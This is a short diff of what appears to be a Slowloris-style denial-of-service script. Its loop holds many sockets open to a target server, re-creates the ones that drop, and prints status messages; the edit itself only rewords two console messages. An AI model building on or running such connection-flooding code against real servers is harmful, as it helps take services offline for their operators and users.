@@ -63,7 +63,7 @@ def main():
     bar.finish()
 
     while True:
-        print(("\033[0;37;40m Kahr Sending to {}".format(len(socket_list))))
+        print(("\033[0;37;40m Sending to packet {}".format(len(socket_list))))
 
         for s in socket_list:
             try:
@@ -72,7 +72,7 @@ def main():
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
+            print(("\033[1;34;40m {}Kahr---Conecting to webs...".format("\n")))
             try:
                 s=init_socket(ip,port)
                 if s:
